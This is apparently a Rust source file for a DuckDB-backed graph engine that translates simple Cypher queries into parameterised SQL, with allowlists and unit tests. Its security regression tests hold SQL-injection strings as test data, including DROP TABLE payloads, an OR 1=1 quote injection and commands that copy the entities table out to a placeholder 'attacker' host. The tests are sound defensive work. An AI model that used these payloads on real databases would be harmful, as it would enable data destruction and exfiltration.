/// Parse a node-pattern `WHERE` clause (e.g. `n.name = 'Ever Given'`) into a
/// SQL fragment with `?` placeholders + bound parameters.
///
/// Returns:
/// - `Some(Some(sql_fragment))` if a recognised WHERE clause was parsed
///   successfully; values are appended to `params`.
/// - `Some(None)` if there is no WHERE clause at all (the query is still valid).
/// - `None` if a WHERE clause exists but uses unrecognised syntax — the
///   caller should refuse to translate.
fn build_node_where_clause(
    q: &str,
    alias: &str,
    params: &mut Vec<Box<dyn duckdb::types::ToSql>>,
) -> Option<Option<String>> {
    let raw = extract_where_str(q);
    let raw = match raw {
        None => return Some(None),
        Some(s) => s,
    };

    // Strip alias prefix (`n.column` → `column`)
    let dealiased = raw.replace(&format!("{}.", alias), "");
    let parsed = parse_simple_eq(&dealiased)?;

    // Allowlist the LHS column.  Anything outside this set is rejected so the
    // translator can return `None` and the caller can surface an error.
    if !is_allowlisted_node_column(&parsed.column) {
        return None;
    }

    params.push(Box::new(parsed.value));
    Some(Some(format!("{} = ?", parsed.column)))
}

/// Parse an edge-pattern `WHERE` clause (e.g. `a.node_id = 'ship_x'`) into a
/// SQL fragment qualified for `src/tgt/e` aliases.
fn build_edge_where_clause(
    q: &str,
    params: &mut Vec<Box<dyn duckdb::types::ToSql>>,
) -> Option<Option<String>> {
    let raw = extract_where_str(q);
    let raw = match raw {
        None => return Some(None),
        Some(s) => s,
    };

    let parsed = parse_simple_eq(&raw)?;

    // Resolve `a.col` / `b.col` / `r.col` into `src.col` / `tgt.col` / `e.col`.
    let (table_alias, col) = if let Some(rest) = parsed.column.strip_prefix("a.") {
        ("src", rest.to_string())
    } else if let Some(rest) = parsed.column.strip_prefix("b.") {
        ("tgt", rest.to_string())
    } else if let Some(rest) = parsed.column.strip_prefix("r.") {
        ("e", rest.to_string())
    } else {
        return None;
    };

    if !is_allowlisted_node_column(&col) && !is_allowlisted_edge_column(&col) {
        return None;
    }

    params.push(Box::new(parsed.value));
    Some(Some(format!("{table_alias}.{col} = ?")))
}

fn is_allowlisted_node_column(c: &str) -> bool {
    matches!(
        c,
        "node_id" | "node_type" | "label" | "name" | "confidence" | "latitude" | "longitude"
    )
}

fn is_allowlisted_edge_column(c: &str) -> bool {
    matches!(
        c,
        "edge_id" | "edge_type" | "from_node" | "to_node" | "weight" | "confidence" | "is_active"
    )
}

// ── Small parsing helpers ─────────────────────────────────────────────────────

/// Parse `MATCH (alias:node_type)` returning (alias, node_type).
fn parse_single_node_match(q: &str) -> Option<(String, String)> {
    let upper = q.to_uppercase();
    let match_pos = upper.find("MATCH")?;
    let after = &q[match_pos + 5..];
    let lparen = after.find('(')?;
    let rparen = after.find(')')?;
    let inner = &after[lparen + 1..rparen];
    let colon = inner.find(':')?;
    let alias = inner[..colon].trim().to_string();
    let node_type = inner[colon + 1..].trim().to_string();
    if alias.is_empty() || node_type.is_empty() {
        return None;
    }
    Some((alias, node_type))
}

fn extract_between(s: &str, start: &str, end: &str) -> Option<String> {
    let si = s.find(start)?;
    let after = &s[si + start.len()..];
    let ei = after.find(end)?;
    Some(after[..ei].to_string())
}

/// Return the trimmed body of the `WHERE` clause (between `WHERE` and the
/// next `RETURN` / end of string). Case-insensitive on the keywords.
fn extract_where_str(q: &str) -> Option<String> {
    let upper = q.to_uppercase();
    let where_pos = upper.find(" WHERE ")?;
    let after = &q[where_pos + 7..];
    let clause = if let Some(ret_pos) = after.to_uppercase().find(" RETURN") {
        &after[..ret_pos]
    } else {
        after
    };
    Some(clause.trim().to_string())
}

struct ParsedEq {
    column: String,
    value: String,
}

/// Parse a single-clause `column = 'value'` WHERE.  This deliberately rejects
/// boolean operators (AND/OR), comments (`--`, `/*`), and any character that
/// isn't part of a simple equality.  Anything more complex returns `None`,
/// which forces the translator to bail and the caller to error out.
fn parse_simple_eq(s: &str) -> Option<ParsedEq> {
    let upper = s.to_uppercase();
    if upper.contains(" AND ")
        || upper.contains(" OR ")
        || upper.contains(';')
        || upper.contains("--")
        || upper.contains("/*")
    {
        return None;
    }

    let (lhs, rhs) = s.split_once('=')?;
    let column = lhs.trim().to_string();
    if column.is_empty() {
        return None;
    }
    // Column must look like an identifier or `alias.identifier`.
    if !column
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.')
    {
        return None;
    }

    let rhs = rhs.trim();
    // Accept either single-quoted string literal or a bare numeric literal.
    let value = if let Some(after) = rhs.strip_prefix('\'') {
        let end = after.find('\'')?;
        after[..end].to_string()
    } else if rhs
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_digit() || c == '-')
    {
        // numeric literal; let DuckDB cast at bind time
        rhs.split_whitespace().next()?.to_string()
    } else {
        return None;
    };
    Some(ParsedEq { column, value })
}

/// Return the user-supplied LIMIT, capped at [`GRAPH_RESULT_HARD_CAP`]. If
/// the user did not specify a LIMIT, default to 1_000.
fn capped_limit(q: &str) -> i64 {
    capped_limit_with_default(q, 1_000)
}

fn capped_limit_with_default(q: &str, default: i64) -> i64 {
    let user = extract_limit(q).unwrap_or(default);
    let cap = GRAPH_RESULT_HARD_CAP as i64;
    user.clamp(1, cap)
}

fn extract_limit(q: &str) -> Option<i64> {
    let upper = q.to_uppercase();
    let pos = upper.find(" LIMIT ")?;
    q[pos + 7..].split_whitespace().next()?.parse().ok()
}

fn extract_id_from_where(q: &str, alias: &str) -> Option<String> {
    let upper = q.to_uppercase();
    let prefix = format!("{}.NODE_ID = ", alias.to_uppercase());
    if let Some(pos) = upper.find(&prefix) {
        let after = q[pos + prefix.len()..].trim_start_matches('\'');
        let end = after.find('\'').unwrap_or(after.len());
        return Some(after[..end].to_string());
    }
    None
}

// ── Value helpers ─────────────────────────────────────────────────────────────

fn opt_jstr(v: Option<String>) -> JsonValue {
    match v {
        Some(s) => JsonValue::String(s),
        None => JsonValue::Null,
    }
}

fn row_value(row: &duckdb::Row, idx: usize) -> JsonValue {
    if let Ok(s) = row.get::<_, String>(idx) {
        return serde_json::from_str(&s).unwrap_or(JsonValue::String(s));
    }
    if let Ok(v) = row.get::<_, f64>(idx) {
        return JsonValue::from(v);
    }
    if let Ok(v) = row.get::<_, i64>(idx) {
        return JsonValue::from(v);
    }
    if let Ok(v) = row.get::<_, bool>(idx) {
        return JsonValue::from(v);
    }
    JsonValue::Null
}

// ── Tests ──────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use duckdb::Connection;
    use std::sync::{Arc, Mutex};

    // ── Setup helpers ─────────────────────────────────────────────────────────

    fn make_engine() -> GraphEngine {
        let conn = Connection::open_in_memory().unwrap();
        conn.execute_batch(ENTITY_SCHEMA).unwrap();
        let arc = Arc::new(Mutex::new(conn));
        GraphEngine::new(arc).unwrap()
    }

    const ENTITY_SCHEMA: &str = r#"
        CREATE TABLE IF NOT EXISTS entities (
            entity_id    VARCHAR PRIMARY KEY,
            entity_type  VARCHAR NOT NULL,
            canonical_id VARCHAR,
            name         VARCHAR,
            first_seen   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            confidence   FLOAT DEFAULT 1.0,
            source_count INTEGER DEFAULT 1,
            is_canonical BOOLEAN DEFAULT FALSE,
            is_active    BOOLEAN DEFAULT TRUE
        );
        CREATE TABLE IF NOT EXISTS entity_properties (
            id             BIGINT PRIMARY KEY,
            entity_id      VARCHAR NOT NULL,
            property_key   VARCHAR NOT NULL,
            property_value VARCHAR NOT NULL,
            property_type  VARCHAR NOT NULL,
            source_id      VARCHAR NOT NULL,
            timestamp      TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            confidence     FLOAT DEFAULT 1.0,
            is_latest      BOOLEAN DEFAULT TRUE
        );
        CREATE TABLE IF NOT EXISTS entity_geometry (
            entity_id    VARCHAR PRIMARY KEY,
            geometry_wkt VARCHAR,
            latitude     FLOAT NOT NULL,
            longitude    FLOAT NOT NULL,
            last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS relationships (
            relationship_id          VARCHAR PRIMARY KEY,
            source_entity_id         VARCHAR NOT NULL,
            target_entity_id         VARCHAR NOT NULL,
            relationship_type        VARCHAR NOT NULL,
            properties               VARCHAR,
            created_timestamp        TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_confirmed_timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            confidence               FLOAT DEFAULT 1.0,
            is_active                BOOLEAN DEFAULT TRUE
        );
    "#;

    fn insert_entity(engine: &GraphEngine, id: &str, etype: &str, name: &str) {
        let conn = engine.conn.lock().unwrap();
        conn.execute(
            "INSERT OR IGNORE INTO entities (entity_id, entity_type, name) VALUES (?, ?, ?)",
            params![id, etype, name],
        )
        .unwrap();
    }

    fn insert_rel(engine: &GraphEngine, rid: &str, src: &str, tgt: &str, rtype: &str) {
        let conn = engine.conn.lock().unwrap();
        conn.execute(
            "INSERT OR IGNORE INTO relationships \
             (relationship_id, source_entity_id, target_entity_id, relationship_type) \
             VALUES (?, ?, ?, ?)",
            params![rid, src, tgt, rtype],
        )
        .unwrap();
    }

    // ── Test 01: schema initialises cleanly ───────────────────────────────────

    #[test]
    fn test_01_schema_init() {
        let engine = make_engine();
        let (nodes, edges) = engine.stats().unwrap();
        assert_eq!(nodes, 0);
        assert_eq!(edges, 0);
    }

    // ── Test 02: sync populates nodes ─────────────────────────────────────────

    #[test]
    fn test_02_sync_populates_nodes() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        insert_entity(&engine, "port_001", "port", "Rotterdam");
        engine.sync_from_entities().unwrap();
        let (nodes, _) = engine.stats().unwrap();
        assert_eq!(nodes, 2);
    }

    // ── Test 03: sync populates edges ─────────────────────────────────────────

    #[test]
    fn test_03_sync_populates_edges() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        insert_entity(&engine, "port_001", "port", "Rotterdam");
        insert_rel(&engine, "r1", "ship_001", "port_001", "docked_at");
        engine.sync_from_entities().unwrap();
        let (_, edges) = engine.stats().unwrap();
        assert_eq!(edges, 1);
    }

    // ── Test 04: get_neighbors depth 1 ───────────────────────────────────────

    #[test]
    fn test_04_get_neighbors_direct() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        insert_entity(&engine, "port_001", "port", "Rotterdam");
        insert_rel(&engine, "r1", "ship_001", "port_001", "docked_at");
        engine.sync_from_entities().unwrap();

        let nbrs = engine.get_neighbors("ship_001", 1).unwrap();
        assert_eq!(nbrs.len(), 1);
        assert_eq!(nbrs[0]["node_id"], JsonValue::String("port_001".into()));
    }

    // ── Test 05: get_neighbors depth 2 ───────────────────────────────────────

    #[test]
    fn test_05_get_neighbors_depth_2() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "A");
        insert_entity(&engine, "port_001", "port", "B");
        insert_entity(&engine, "org_001", "organization", "C");
        insert_rel(&engine, "r1", "ship_001", "port_001", "docked_at");
        insert_rel(&engine, "r2", "port_001", "org_001", "in_region");
        engine.sync_from_entities().unwrap();

        let nbrs = engine.get_neighbors("ship_001", 2).unwrap();
        let ids: Vec<&JsonValue> = nbrs.iter().map(|m| &m["node_id"]).collect();
        assert!(ids.contains(&&JsonValue::String("port_001".into())));
        assert!(ids.contains(&&JsonValue::String("org_001".into())));
    }

    // ── Test 06: path query single hop ───────────────────────────────────────

    #[test]
    fn test_06_path_query_single_hop() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "A");
        insert_entity(&engine, "port_001", "port", "B");
        insert_rel(&engine, "r1", "ship_001", "port_001", "heading_to");
        engine.sync_from_entities().unwrap();

        let paths = engine.path_query("ship_001", "port_001", 3).unwrap();
        assert!(!paths.is_empty());
        assert_eq!(paths[0][0].source_entity_id, "ship_001");
        assert_eq!(paths[0][0].target_entity_id, "port_001");
    }

    // ── Test 07: path query multi hop ────────────────────────────────────────

    #[test]
    fn test_07_path_query_multi_hop() {
        let engine = make_engine();
        insert_entity(&engine, "a", "ship", "A");
        insert_entity(&engine, "b", "port", "B");
        insert_entity(&engine, "c", "organization", "C");
        insert_rel(&engine, "r1", "a", "b", "heading_to");
        insert_rel(&engine, "r2", "b", "c", "in_region");
        engine.sync_from_entities().unwrap();

        let paths = engine.path_query("a", "c", 3).unwrap();
        assert!(!paths.is_empty());
        assert_eq!(paths[0].len(), 2);
        assert_eq!(paths[0][0].source_entity_id, "a");
        assert_eq!(paths[0][1].target_entity_id, "c");
    }

    // ── Test 08: path query no path ───────────────────────────────────────────

    #[test]
    fn test_08_path_query_no_path() {
        let engine = make_engine();
        insert_entity(&engine, "a", "ship", "A");
        insert_entity(&engine, "b", "port", "B");
        engine.sync_from_entities().unwrap();

        let paths = engine.path_query("a", "b", 5).unwrap();
        assert!(paths.is_empty());
    }

    // ── Test 09: shortest path prefers fewer hops ────────────────────────────

    #[test]
    fn test_09_shortest_path() {
        let engine = make_engine();
        insert_entity(&engine, "a", "ship", "A");
        insert_entity(&engine, "b", "port", "B");
        insert_entity(&engine, "c", "organization", "C");
        insert_rel(&engine, "r1", "a", "b", "heading_to");
        insert_rel(&engine, "r2", "b", "c", "in_region");
        insert_rel(&engine, "r3", "a", "c", "owns"); // direct 1-hop
        engine.sync_from_entities().unwrap();

        let path = engine.shortest_path("a", "c").unwrap();
        assert!(path.is_some());
        assert_eq!(path.unwrap().len(), 1); // direct path wins
    }

    // ── Test 10: Cypher single node match ────────────────────────────────────

    #[test]
    fn test_10_cypher_single_node_match() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        insert_entity(&engine, "ship_002", "ship", "MSC Oscar");
        insert_entity(&engine, "port_001", "port", "Rotterdam");
        engine.sync_from_entities().unwrap();

        let results = engine.cypher_query("MATCH (n:ship) RETURN n").unwrap();
        assert_eq!(results.len(), 2);
    }

    // ── Test 11: Cypher edge match ───────────────────────────────────────────

    #[test]
    fn test_11_cypher_edge_match() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        insert_entity(&engine, "port_001", "port", "Rotterdam");
        insert_rel(&engine, "r1", "ship_001", "port_001", "docked_at");
        engine.sync_from_entities().unwrap();

        let results = engine
            .cypher_query("MATCH (a)-[r:docked_at]->(b) RETURN a, r, b")
            .unwrap();
        assert_eq!(results.len(), 1);
    }

    // ── Test 12: sync removes deactivated entities ───────────────────────────

    #[test]
    fn test_12_sync_removes_deactivated_entities() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        engine.sync_from_entities().unwrap();
        assert_eq!(engine.stats().unwrap().0, 1);

        {
            let conn = engine.conn.lock().unwrap();
            conn.execute(
                "UPDATE entities SET is_active = FALSE WHERE entity_id = ?",
                params!["ship_001"],
            )
            .unwrap();
        }
        engine.sync_from_entities().unwrap();
        assert_eq!(engine.stats().unwrap().0, 0);
    }

    // ── Test 13: typed node views ────────────────────────────────────────────

    #[test]
    fn test_13_typed_node_views() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        insert_entity(&engine, "aircraft_001", "aircraft", "BA123");
        insert_entity(&engine, "port_001", "port", "Rotterdam");
        engine.sync_from_entities().unwrap();

        let ships = engine.execute_raw_sql("SELECT * FROM ship_nodes").unwrap();
        assert_eq!(ships.len(), 1);

        let aircraft = engine
            .execute_raw_sql("SELECT * FROM aircraft_nodes")
            .unwrap();
        assert_eq!(aircraft.len(), 1);

        let ports = engine.execute_raw_sql("SELECT * FROM port_nodes").unwrap();
        assert_eq!(ports.len(), 1);
    }

    // ── Test 14: typed edge views ────────────────────────────────────────────

    #[test]
    fn test_14_typed_edge_views() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        insert_entity(&engine, "port_001", "port", "Rotterdam");
        insert_rel(&engine, "r1", "ship_001", "port_001", "docked_at");
        insert_rel(&engine, "r2", "ship_001", "port_001", "heading_to");
        engine.sync_from_entities().unwrap();

        let docked = engine.execute_raw_sql("SELECT * FROM docked_at").unwrap();
        assert_eq!(docked.len(), 1);

        let heading = engine.execute_raw_sql("SELECT * FROM heading_to").unwrap();
        assert_eq!(heading.len(), 1);
    }

    // ── Test 15: path max hops limit ─────────────────────────────────────────

    #[test]
    fn test_15_path_max_hops_respected() {
        let engine = make_engine();
        insert_entity(&engine, "a", "ship", "A");
        insert_entity(&engine, "b", "port", "B");
        insert_entity(&engine, "c", "organization", "C");
        insert_entity(&engine, "d", "ship", "D");
        insert_rel(&engine, "r1", "a", "b", "heading_to");
        insert_rel(&engine, "r2", "b", "c", "in_region");
        insert_rel(&engine, "r3", "c", "d", "owns");
        engine.sync_from_entities().unwrap();

        // max_hops=2: path a->b->c->d needs 3 hops, should NOT be found
        let paths_2 = engine.path_query("a", "d", 2).unwrap();
        assert!(
            paths_2.is_empty(),
            "should not find 3-hop path with max_hops=2"
        );

        // max_hops=3: should find path
        let paths_3 = engine.path_query("a", "d", 3).unwrap();
        assert!(
            !paths_3.is_empty(),
            "should find 3-hop path with max_hops=3"
        );
        assert_eq!(paths_3[0].len(), 3);
    }

    // ── Security tests (CVE-class: cypher SQL-injection regression) ──────────

    /// Helper: assert that a cypher query is rejected by the translator with
    /// the unsupported-pattern error and that the canary table still exists.
    fn assert_cypher_rejected_and_no_sql_executed(engine: &GraphEngine, q: &str) {
        // Insert a canary entity so we can detect any DROP TABLE side-effect.
        insert_entity(engine, "canary_001", "ship", "Canary");
        engine.sync_from_entities().unwrap();
        assert_eq!(
            engine.stats().unwrap().0,
            1,
            "canary should exist before query"
        );

        let result = engine.cypher_query(q);
        assert!(result.is_err(), "expected query to be rejected: {q}");
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("Unsupported cypher query") || err_msg.contains("MATCH/RETURN"),
            "error should mention unsupported cypher; got: {err_msg}"
        );

        // Canary still exists — no side-effects ran.
        let (nodes, _) = engine.stats().unwrap();
        assert_eq!(nodes, 1, "canary entity must survive a rejected query");
    }

    // Test 16: a query containing `; DROP TABLE entities --` is rejected with
    // a clear error and no SQL executes.
    #[test]
    fn test_16_unsupported_cypher_rejected() {
        let engine = make_engine();
        let evil = "MATCH (n:ship); DROP TABLE entities -- RETURN n";
        assert_cypher_rejected_and_no_sql_executed(&engine, evil);

        // Other obvious raw-SQL injections must also fail.
        let engine = make_engine();
        assert_cypher_rejected_and_no_sql_executed(&engine, "DROP TABLE entities;");

        let engine = make_engine();
        assert_cypher_rejected_and_no_sql_executed(
            &engine,
            "ATTACH DATABASE 'http://attacker/db.duckdb' AS exfil",
        );

        let engine = make_engine();
        assert_cypher_rejected_and_no_sql_executed(
            &engine,
            "INSTALL httpfs; LOAD httpfs; COPY (SELECT * FROM entities) TO 'http://attacker/'",
        );
    }

    // Test 17: quote-injection inside an `n.id` value is treated as a literal
    // and therefore matches no rows — it cannot break out of the value.
    #[test]
    fn test_17_quote_injection_in_src_id() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        engine.sync_from_entities().unwrap();

        // The injection payload would, under string interpolation, become:
        //   WHERE node_id = '' OR 1=1 --'
        // which would return every row.  With bound parameters it must match
        // zero rows because the literal `' OR 1=1 --` is the bound value.
        let q = "MATCH (n:ship) WHERE n.node_id = '\\' OR 1=1 --' RETURN n";
        let res = engine.cypher_query(q);
        // It is acceptable for this to be either rejected by the parser
        // (because `OR` is forbidden) OR to return zero rows.  Both are safe.
        match res {
            Ok(rows) => assert!(
                rows.is_empty(),
                "quote-injection must not return any rows; got {} rows",
                rows.len()
            ),
            Err(e) => {
                let m = e.to_string();
                assert!(
                    m.contains("Unsupported cypher query"),
                    "expected unsupported-cypher rejection, got: {m}"
                );
            }
        }

        // Also: a benign `n.node_id = 'no_such_id'` returns 0 rows (engine works).
        let benign = engine
            .cypher_query("MATCH (n:ship) WHERE n.node_id = 'no_such_id' RETURN n")
            .unwrap();
        assert_eq!(benign.len(), 0);

        // And a real id matches one row (engine still functional after
        // injection attempt).
        let hit = engine
            .cypher_query("MATCH (n:ship) WHERE n.node_id = 'ship_001' RETURN n")
            .unwrap();
        assert_eq!(hit.len(), 1);
    }

    // Test 18: a user-supplied LIMIT of 1_000_000_000 is silently capped at
    // GRAPH_RESULT_HARD_CAP (10_000).
    #[test]
    fn test_18_limit_capped() {
        let engine = make_engine();
        // Seed enough rows that, without a cap, a runaway query would be
        // expensive.  We only need 11 to prove the cap works against a small
        // dataset because GRAPH_RESULT_HARD_CAP is well above that — but the
        // important assertion is that we never bind a value larger than the
        // cap.  We test via a translator-level invariant.

        // Translate the user query and inspect the bound LIMIT param.
        let translated = super::try_translate_cypher("MATCH (n:ship) RETURN n LIMIT 1000000000")
            .expect("query should translate");

        // Last param is the LIMIT we bind; ensure it fits inside the cap.
        // We can't read it back from the trait object directly, so we go
        // through DuckDB by running a query that returns the LIMIT param.
        // Simpler: run the query against a small dataset and check that
        // the executor never returns more than GRAPH_RESULT_HARD_CAP rows.
        for i in 0..15 {
            insert_entity(
                &engine,
                &format!("ship_{i:03}"),
                "ship",
                &format!("Ship {i}"),
            );
        }
        engine.sync_from_entities().unwrap();

        let rows = engine
            .cypher_query("MATCH (n:ship) RETURN n LIMIT 1000000000")
            .unwrap();
        assert!(
            rows.len() <= super::GRAPH_RESULT_HARD_CAP,
            "results must respect GRAPH_RESULT_HARD_CAP"
        );
        assert_eq!(rows.len(), 15, "should return exactly the seeded ships");

        // Also verify the SQL itself never carries the unbounded value
        // verbatim — only `?` placeholders.
        assert!(
            translated.sql.contains("LIMIT ?"),
            "translated SQL must use a bound LIMIT placeholder, not interpolation; got: {}",
            translated.sql
        );
        assert!(
            !translated.sql.contains("1000000000"),
            "translated SQL must not contain the unbounded user value; got: {}",
            translated.sql
        );
    }

    // Test 19: an unknown edge_type is rejected rather than going to raw SQL.
    #[test]
    fn test_19_edge_type_allowlist() {
        let engine = make_engine();
        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
        insert_entity(&engine, "port_001", "port", "Rotterdam");
        insert_rel(&engine, "r1", "ship_001", "port_001", "docked_at");
        engine.sync_from_entities().unwrap();

        // A known edge type still works.
        let ok = engine
            .cypher_query("MATCH (a)-[r:docked_at]->(b) RETURN a, r, b")
            .unwrap();
        assert_eq!(ok.len(), 1);

        // An unknown edge type must fail closed — no raw-SQL fallback.
        let bad = engine.cypher_query("MATCH (a)-[r:not_a_real_edge]->(b) RETURN a, b");
        assert!(bad.is_err(), "unknown edge type must be rejected");
        assert!(
            bad.unwrap_err()
                .to_string()
                .contains("Unsupported cypher query"),
            "unknown edge type error must surface unsupported-cypher message"
        );

        // Edge-type that would inject SQL must also be rejected.
        let inj =
            engine.cypher_query("MATCH (a)-[r:foo'; DROP TABLE entities --]->(b) RETURN a, b");
        assert!(inj.is_err(), "injection in edge type must be rejected");
    }

    // Test 20: raw passthrough is GONE — `SELECT 1` is no longer accepted as
    // a cypher query (regression test for the audit finding).
    #[test]
    fn test_20_raw_sql_passthrough_removed() {
        let engine = make_engine();
        let res = engine.cypher_query("SELECT 1");
        assert!(
            res.is_err(),
            "raw SQL passthrough must be removed; got {res:?}"
        );
        let res = engine.cypher_query("SELECT * FROM graph_nodes");
        assert!(
            res.is_err(),
            "raw SQL passthrough must be removed; got {res:?}"
        );
    }

    // Test 21: unknown node type (e.g. `MATCH (n:hacker)`) is rejected, not
    // silently mapped to `graph_nodes`.
    #[test]
    fn test_21_node_type_allowlist() {
        let engine = make_engine();
        let res = engine.cypher_query("MATCH (n:not_a_real_type) RETURN n");
        assert!(res.is_err(), "unknown node type must be rejected");
    }
}
